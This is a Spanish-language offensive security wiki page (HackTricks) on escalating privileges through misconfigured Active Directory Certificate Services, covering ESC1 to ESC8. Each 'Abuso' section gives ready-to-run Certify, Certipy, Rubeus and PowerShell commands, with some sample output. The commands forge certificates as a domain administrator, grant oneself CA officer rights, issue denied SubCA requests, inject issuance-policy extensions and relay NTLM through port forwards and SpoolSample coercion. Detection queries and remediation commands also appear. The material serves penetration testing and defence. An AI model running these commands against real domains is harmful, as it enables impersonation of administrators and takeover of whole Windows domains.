# Escalada de dominio de AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Este es un resumen de las secciones sobre técnicas de escalada de las publicaciones:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Certificate Templates mal configuradas - ESC1

### Explicación

### Explicación de Certificate Templates mal configuradas - ESC1

- **La Enterprise CA concede derechos de inscripción a usuarios con pocos privilegios.**
- **No se requiere la aprobación de un manager.**
- **No se necesitan firmas del personal autorizado.**
- **Los descriptores de seguridad de los certificate templates son demasiado permisivos, lo que permite a los usuarios con pocos privilegios obtener derechos de inscripción.**
- **Los certificate templates están configurados para definir EKU que facilitan la autenticación:**
- Se incluyen identificadores de Extended Key Usage (EKU), como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) o ningún EKU (SubCA).
- **El template permite a los solicitantes incluir un subjectAltName en el Certificate Signing Request (CSR):**
- Active Directory (AD) prioriza el subjectAltName (SAN) de un certificado para la verificación de identidad, si está presente. Esto significa que, al especificar el SAN en un CSR, se puede solicitar un certificado para suplantar a cualquier usuario (por ejemplo, un administrador del dominio). La posibilidad de que el solicitante especifique un SAN se indica en el objeto de Active Directory del certificate template mediante la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite que el solicitante especifique el SAN.

> [!CAUTION]
> La configuración descrita permite a los usuarios con pocos privilegios solicitar certificados con cualquier SAN, lo que permite autenticarse como cualquier principal del dominio mediante Kerberos o SChannel.

Esta funcionalidad se habilita a veces para permitir la generación sobre la marcha de certificados HTTPS o de host por parte de productos o servicios de deployment, o debido a una falta de comprensión.

Cabe señalar que crear un certificado con esta opción activa una advertencia, lo que no ocurre cuando se duplica un certificate template existente (como el template `WebServer`, que tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado) y luego se modifica para incluir un OID de autenticación.<sup>[[6]](#references)</sup>

### Abuso

Para **encontrar certificate templates vulnerables**, puedes ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad para suplantar a un administrador**, se podría ejecutar:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Luego puedes transformar el **certificate generado al formato `.pfx`** y utilizarlo para **autenticarte usando Rubeus o certipy** nuevamente:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" pueden utilizarse para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

La enumeración de las plantillas de certificados dentro del esquema de configuración del AD Forest, específicamente aquellas que no requieren aprobación ni firmas, que poseen un EKU de Client Authentication o Smart Card Logon y que tienen habilitado el indicador `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, puede realizarse ejecutando la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Plantillas de certificados mal configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. La Enterprise CA concede derechos de inscripción a usuarios con pocos privilegios.
2. El requisito de aprobación del responsable está deshabilitado.
3. Se omite la necesidad de firmas autorizadas.
4. Un descriptor de seguridad demasiado permisivo en la plantilla de certificados concede derechos de inscripción de certificados a usuarios con pocos privilegios.
5. **La plantilla de certificados está definida para incluir el Any Purpose EKU o ningún EKU.**

El **Any Purpose EKU** permite que un atacante obtenga un certificado para **cualquier propósito**, incluida la autenticación de cliente, la autenticación de servidor, la firma de código, etc. La misma **técnica utilizada para ESC3** puede emplearse para explotar este escenario.

Los certificados **sin EKU**, que actúan como certificados de CA subordinada, pueden explotarse para **cualquier propósito** y **también pueden utilizarse para firmar nuevos certificados**. Por lo tanto, un atacante podría especificar EKU o campos arbitrarios en los nuevos certificados utilizando un certificado de CA subordinada.

Sin embargo, los nuevos certificados creados para la **autenticación de dominio** no funcionarán si la CA subordinada no es de confianza para el objeto **`NTAuthCertificates`**, que es la configuración predeterminada. No obstante, un atacante todavía puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían **abusarse** potencialmente para una amplia variedad de propósitos (p. ej., firma de código, autenticación de servidor, etc.) y podrían tener implicaciones importantes para otras aplicaciones de la red, como SAML, AD FS o IPSec.<sup>[[6]](#references)</sup>

Para enumerar las plantillas que coinciden con este escenario dentro del esquema de configuración del AD Forest, se puede ejecutar la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Plantillas de Enrollment Agent mal configuradas - ESC3

### Explicación

Este escenario es similar al primero y al segundo, pero **abusa** de un **EKU diferente** (Certificate Request Agent) y de **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos).

El **EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Enrollment Agent** en la documentación de Microsoft, permite a una entidad principal **solicitar** un **certificado** **en nombre de otro usuario**.

El **“Enrollment Agent”** solicita una **plantilla** de este tipo y utiliza el **certificado resultante para firmar conjuntamente una CSR en nombre del otro usuario**. A continuación, **envía** la **CSR firmada conjuntamente** a la CA, solicitando una **plantilla** que **permite “enroll on behalf of”**, y la CA responde con un **certificado perteneciente al “otro” usuario**.<sup>[[6]](#references)</sup>

**Requisitos 1:**

- La Enterprise CA concede derechos de solicitud a usuarios con pocos privilegios.
- Se omite el requisito de aprobación del manager.
- No se requiere ninguna firma autorizada.
- El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo y concede derechos de solicitud a usuarios con pocos privilegios.
- La plantilla de certificado incluye el EKU Certificate Request Agent, lo que permite solicitar otras plantillas de certificados en nombre de otras entidades principales.

**Requisitos 2:**

- La Enterprise CA concede derechos de solicitud a usuarios con pocos privilegios.
- Se omite la aprobación del manager.
- La versión del esquema de la plantilla es 1 o superior a 2, y especifica un Application Policy Issuance Requirement que requiere el EKU Certificate Request Agent.
- Un EKU definido en la plantilla de certificado permite la autenticación en el dominio.
- No se aplican restricciones para Enrollment Agents en la CA.

### Abuso

Puedes utilizar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Los **usuarios** a los que se permite **obtener** un **certificado de agente de enrollment**, las plantillas en las que los **agentes** de enrollment pueden inscribirse y las **cuentas** en cuyo nombre puede actuar el agente de enrollment pueden estar restringidos por las CA empresariales. Esto se consigue abriendo el **complemento** `certsrc.msc`, haciendo **clic derecho en la CA**, haciendo **clic en Propiedades** y, a continuación, **navegando** hasta la pestaña “Agentes de enrollment”.

Sin embargo, cabe señalar que la configuración **predeterminada** de las CA es “**No restringir los agentes de enrollment**”. Cuando los administradores habilitan la restricción de los agentes de enrollment y establecen “Restringir los agentes de enrollment”, la configuración predeterminada sigue siendo extremadamente permisiva. Permite que **Everyone** se inscriba en todas las plantillas como cualquier usuario.

### PoCs de PowerShell solo para Windows con Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) ejecuta ESC1 y ESC2/ESC3 sin Certify ni Certipy. Sus scripts crean una clave RSA de 2048 bits exportable con la API COM `X509Enrollment`, construyen una solicitud PKCS#10, descubren el primer `pKIEnrollmentService` mediante LDAP, la envían a través de `CertificateAuthority.Request`, instalan la respuesta en `Cert:\CurrentUser\My` y exportan un PFX codificado en Base64. El script de ESC1 añade un SAN UPN seleccionado por el atacante (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valor `0xb`), mientras que los scripts de ESC2/ESC3 utilizan el primer certificado para firmar una solicitud PKCS#7 en nombre de otra identidad.<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
Los scripts imprimen el Base64 del **PFX**, que incluye la clave privada, para usarlo directamente con Rubeus. No lo reemplaces por `[Convert]::ToBase64String($cert.RawData)`: `RawData` codifica únicamente el certificado público y no puede firmar la solicitud PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Control de acceso vulnerable de Certificate Template - ESC4

### **Explicación**

El **descriptor de seguridad** de las **plantillas de certificados** define los **permisos** que poseen los **principals de AD** específicos sobre la plantilla.

Si un **attacker** posee los **permisos** necesarios para **alterar** una **plantilla** e **implementar** cualquiera de las **configuraciones incorrectas explotables** descritas en las **secciones anteriores**, se podría facilitar una escalada de privilegios.

Entre los permisos importantes aplicables a las plantillas de certificados se incluyen:<sup>[[6]](#references)</sup>

- **Owner:** Otorga control implícito sobre el objeto, lo que permite modificar cualquier atributo.
- **FullControl:** Permite obtener autoridad completa sobre el objeto, incluida la capacidad de modificar cualquier atributo.
- **WriteOwner:** Permite cambiar el propietario del objeto a un principal bajo el control del attacker.
- **WriteDacl:** Permite ajustar los controles de acceso, lo que potencialmente concede FullControl al attacker.
- **WriteProperty:** Autoriza la edición de cualquier propiedad del objeto.

### Abuso

Para identificar principals con permisos de edición sobre plantillas y otros objetos PKI, enumera con Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un ejemplo de un privesc como el anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ocurre cuando un usuario tiene privilegios de escritura sobre una plantilla de certificados. Esto puede aprovecharse, por ejemplo, para sobrescribir la configuración de la plantilla de certificados y hacer que sea vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene la nueva relación `AddKeyCredentialLink` con `JOHNPC`. Dado que esta técnica está relacionada con certificados, también he implementado este ataque, conocido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Aquí tienes un pequeño adelanto del comando `shadow auto` de Certipy para recuperar el hash NT de la víctima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. De forma **predeterminada**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el **parámetro `-save-old` para guardar la configuración anterior**, lo que será útil para **restaurar** la configuración después de nuestro ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Control de acceso vulnerable a objetos PKI - ESC5

### Explicación

La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos además de las plantillas de certificados y la autoridad de certificación, puede afectar a la seguridad de todo el sistema AD CS. Estos objetos, que pueden afectar significativamente a la seguridad, incluyen:

- El objeto de equipo de AD del servidor de la CA, que puede verse comprometido mediante mecanismos como S4U2Self o S4U2Proxy.
- El servidor RPC/DCOM del servidor de la CA.
- Cualquier objeto o contenedor descendiente de AD dentro de la ruta de contenedor específica `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esta ruta incluye, entre otros, contenedores y objetos como el contenedor Certificate Templates, el contenedor Certification Authorities, el objeto NTAuthCertificates y el Enrollment Services Container.

La seguridad del sistema PKI puede verse comprometida si un atacante con pocos privilegios consigue tomar el control de cualquiera de estos componentes críticos.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

El tema tratado en la [**publicación de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) también aborda las implicaciones del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, tal como describe Microsoft. Esta configuración, cuando se activa en una Certification Authority (CA), permite incluir **valores definidos por el usuario** en el **subject alternative name** para **cualquier solicitud**, incluidas las construidas a partir de Active Directory®. En consecuencia, esta opción permite a un **intruso** inscribirse mediante **cualquier plantilla** configurada para la **autenticación** del dominio, específicamente aquellas que permiten la inscripción de usuarios **sin privilegios**, como la plantilla User estándar. Como resultado, se puede obtener un certificado que permita al intruso autenticarse como administrador del dominio o como **cualquier otra entidad activa** dentro del dominio.<sup>[[9]](#references)</sup>

**Nota**: El método para añadir **nombres alternativos** a una Certificate Signing Request (CSR), mediante el argumento `-attrib "SAN:"` en `certreq.exe` (denominado “Name Value Pairs”), presenta un **contraste** con la estrategia de explotación de SANs en ESC1. La diferencia reside en **cómo se encapsula la información de la cuenta**: dentro de un atributo del certificado, en lugar de una extensión.

### Abuso

Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operación emplea esencialmente el **acceso al registro remoto**, por lo que un enfoque alternativo podría ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Herramientas como [**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) son capaces de detectar esta configuración incorrecta y explotarla:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para modificar estos ajustes, suponiendo que se poseen **derechos administrativos del dominio** o equivalentes, se puede ejecutar el siguiente comando desde cualquier estación de trabajo:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para deshabilitar esta configuración en tu entorno, el flag se puede eliminar con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Tras las actualizaciones de seguridad de mayo de 2022, los **certificates** recién emitidos contendrán una **security extension** que incorpora la propiedad `objectSid` del **requester**. Para ESC1, este SID se deriva del SAN especificado. Sin embargo, para **ESC6**, el SID refleja el `objectSid` del **requester**, no el SAN.\
> Para explotar ESC6, es esencial que el sistema sea susceptible a ESC10 (Weak Certificate Mappings), que prioriza el **SAN sobre la nueva security extension**.

## Control de acceso vulnerable de la Certificate Authority - ESC7

### Ataque 1

#### Explicación

El control de acceso de una certificate authority se mantiene mediante un conjunto de permisos que regulan las acciones de la CA. Estos permisos pueden visualizarse accediendo a `certsrv.msc`, haciendo clic derecho en una CA, seleccionando las propiedades y navegando hasta la pestaña Security. Además, los permisos pueden enumerarse mediante el módulo PSPKI con comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Esto proporciona información sobre los derechos principales, concretamente **`ManageCA`** y **`ManageCertificates`**, que se corresponden con los roles de “administrador de CA” y “Certificate Manager”, respectivamente.<sup>[[6]](#references)</sup>

#### Abuso

Tener derechos **`ManageCA`** sobre una autoridad de certificación permite al principal manipular la configuración de forma remota mediante PSPKI. Esto incluye activar el flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier template, un aspecto crítico de la escalada de dominio.

La simplificación de este proceso es posible mediante el uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, lo que permite realizar modificaciones sin interactuar directamente con la GUI.

Tener derechos **`ManageCertificates`** facilita la aprobación de solicitudes pendientes, eludiendo eficazmente la medida de seguridad de “aprobación del administrador de certificados de la CA”.

Se puede utilizar una combinación de los módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

> [!WARNING]
> En el **ataque anterior**, los permisos de **`Manage CA`** se usaron para **habilitar** el indicador **EDITF_ATTRIBUTESUBJECTALTNAME2** y realizar el **ataque ESC6**, pero esto no tendrá ningún efecto hasta que se reinicie el servicio de CA (`CertSvc`). Cuando un usuario tiene el derecho de acceso **`Manage CA`**, también puede **reiniciar el servicio**. Sin embargo, esto **no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, E**SC6 podría no funcionar de forma predeterminada** en la mayoría de los entornos con parches debido a las actualizaciones de seguridad de mayo de 2022.

Por lo tanto, aquí se presenta otro ataque.

Requisitos:

- Solo el permiso **`ManageCA`**
- Permiso **`Manage Certificates`** (se puede conceder desde **`ManageCA`**)
- La plantilla de certificado **`SubCA`** debe estar **habilitada** (se puede habilitar desde **`ManageCA`**)

La técnica se basa en el hecho de que los usuarios con los derechos de acceso `Manage CA` _y_ `Manage Certificates` pueden **emitir solicitudes de certificados fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Por lo tanto, un **usuario** puede **solicitar** inscribirse en **`SubCA`** —lo que será **denegado**—, pero **posteriormente el responsable la emitirá**.<sup>[[6]](#references)</sup>

#### Abuso

Puedes **concederte el derecho de acceso `Manage Certificates`** añadiendo tu usuario como nuevo responsable.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La plantilla **`SubCA`** puede **habilitarse en la CA** con el parámetro `-enable-template`. De forma predeterminada, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido los prerrequisitos para este ataque, podemos empezar **solicitando un certificado basado en la plantilla `SubCA`**.

**Esta solicitud será denegada**, pero guardaremos la clave privada y anotaremos el ID de la solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestros **`Manage CA` y `Manage Certificates`**, podemos entonces **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y, por último, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuso de la extensión Manage Certificates (SetExtension)

#### Explicación

Además de los abusos clásicos de ESC7 (habilitar atributos EDITF o aprobar solicitudes pendientes), **Certify 2.0** reveló una primitiva completamente nueva que solo requiere el rol *Manage Certificates* (también denominado **Certificate Manager / Officer**) en la Enterprise CA.<sup>[[3]](#references)</sup>

El método RPC `ICertAdmin::SetExtension` puede ser ejecutado por cualquier principal que tenga *Manage Certificates*. Aunque tradicionalmente las CA legítimas utilizaban este método para actualizar extensiones en solicitudes **pendientes**, un atacante puede abusar de él para **añadir una *extensión de certificado no predeterminada*** (por ejemplo, un OID personalizado de *Certificate Issuance Policy*, como `1.1.1.1`) a una solicitud que está esperando aprobación.

Como la plantilla objetivo **no define un valor predeterminado para esa extensión**, la CA NO sobrescribirá el valor controlado por el atacante cuando la solicitud se emita finalmente. Por lo tanto, el certificado resultante contiene una extensión elegida por el atacante que puede:

* Satisfacer los requisitos de Application / Issuance Policy de otras plantillas vulnerables (provocando una escalada de privilegios).
* Inyectar EKUs o políticas adicionales que otorguen al certificado una confianza inesperada en sistemas de terceros.

En resumen, *Manage Certificates* —considerado anteriormente la mitad “menos poderosa” de ESC7— ahora puede utilizarse para lograr una escalada de privilegios completa o persistencia a largo plazo, sin modificar la configuración de la CA ni requerir el derecho más restrictivo *Manage CA*.

#### Abuso de la primitiva con Certify 2.0

1. **Envía una solicitud de certificado que permanecerá *pendiente*.** Esto puede forzarse mediante una plantilla que requiera aprobación del administrador:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Añade una extensión personalizada a la solicitud pendiente** mediante el nuevo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Si la plantilla no define ya la extensión *Certificate Issuance Policies*, el valor anterior se conservará después de la emisión.*

3. **Emite la solicitud** (si tu rol también tiene permisos de aprobación de *Manage Certificates*) o espera a que un operador la apruebe. Una vez emitida, descarga el certificado:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. El certificado resultante ahora contiene el OID de issuance-policy malicioso y puede utilizarse en ataques posteriores (por ejemplo, ESC13, escalada de dominio, etc.).

> NOTA: El mismo ataque puede ejecutarse con Certipy ≥ 4.7 mediante el comando `ca` y el parámetro `-set-extension`.

## NTLM Relay a endpoints HTTP de AD CS – ESC8

### Explicación

> [!TIP]
> En entornos donde **AD CS está instalado**, si existe un **endpoint de web enrollment vulnerable** y hay publicada al menos una **plantilla de certificado que permita el enrollment de equipos del dominio y la autenticación de cliente** (como la plantilla predeterminada **`Machine`**), ¡es posible que **cualquier equipo con el servicio spooler activo sea comprometido por un atacante**!

AD CS admite varios **métodos de enrollment basados en HTTP**, disponibles mediante roles de servidor adicionales que los administradores pueden instalar. Estas interfaces de enrollment de certificados basadas en HTTP son susceptibles a **ataques de NTLM relay**. Desde una **máquina comprometida, un atacante puede suplantar cualquier cuenta de AD que se autentique mediante NTLM entrante**. Mientras suplanta a la cuenta víctima, un atacante puede acceder a estas interfaces web para **solicitar un certificado de autenticación de cliente utilizando las plantillas de certificado `User` o `Machine`**.

- La **interfaz de web enrollment** (una aplicación ASP antigua disponible en `http://<caserver>/certsrv/`) utiliza HTTP únicamente de forma predeterminada, lo que no ofrece protección contra ataques de NTLM relay. Además, permite explícitamente solo la autenticación NTLM mediante su encabezado HTTP Authorization, lo que hace inaplicables métodos de autenticación más seguros, como Kerberos.
- El **Certificate Enrollment Service** (CES), el Web Service **Certificate Enrollment Policy** (CEP) y el **Network Device Enrollment Service** (NDES) admiten de forma predeterminada la autenticación negotiate mediante su encabezado HTTP Authorization. La autenticación negotiate admite tanto **Kerberos** como **NTLM**, lo que permite a un atacante **degradar a la autenticación NTLM** durante los ataques de relay. Aunque estos web services habilitan HTTPS de forma predeterminada, HTTPS por sí solo **no protege contra los ataques de NTLM relay**. La protección contra ataques de NTLM relay para servicios HTTPS solo es posible cuando HTTPS se combina con channel binding. Lamentablemente, AD CS no activa Extended Protection for Authentication en IIS, que es necesario para channel binding.<sup>[[6]](#references)</sup>

Un **problema** habitual de los ataques de NTLM relay es la **corta duración de las sesiones NTLM** y la imposibilidad del atacante de interactuar con servicios que **requieren NTLM signing**.

No obstante, esta limitación se supera explotando un ataque de NTLM relay para obtener un certificado para el usuario, ya que el período de validez del certificado determina la duración de la sesión, y el certificado puede utilizarse con servicios que **exigen NTLM signing**. Para consultar instrucciones sobre cómo utilizar un certificado robado, véase:


{{#ref}}
account-persistence.md
{{#endref}}

Otra limitación de los ataques de NTLM relay es que **una cuenta víctima debe autenticarse ante una máquina controlada por el atacante**. El atacante puede esperar o intentar **forzar** esta autenticación:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify) enumera los **endpoints HTTP de AD CS habilitados**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propiedad `msPKI-Enrollment-Servers` es utilizada por las Certificate Authorities (CAs) empresariales para almacenar endpoints de Certificate Enrollment Service (CES). Estos endpoints se pueden analizar y enumerar utilizando la herramienta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse con [Certipy](https://github.com/ly4k/Certipy)

Certipy realiza de forma predeterminada la solicitud de un certificado basándose en el template `Machine` o `User`, según si el nombre de la cuenta que se está relay termina en `$`. La especificación de un template alternativo se puede realizar mediante el parámetro `-template`.

